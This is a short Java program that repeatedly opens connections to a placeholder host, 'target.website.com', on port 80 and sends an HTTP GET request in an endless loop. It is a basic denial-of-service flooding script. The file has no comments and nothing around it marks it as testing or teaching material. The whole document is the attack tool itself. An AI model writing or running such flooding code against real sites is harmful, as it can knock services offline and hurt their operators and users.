import java.net.*;
import java.io.*;

public class Main {
    public static void main(String[] args) throws Exception {
        String target = "target.website.com";
        int port = 80;
        while (true) {
            Socket socket = new Socket(target, port);
            OutputStream out = socket.getOutputStream();
            out.write(("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n").getBytes());
            out.flush();
            out.close();
            socket.close();
        }
    }
}
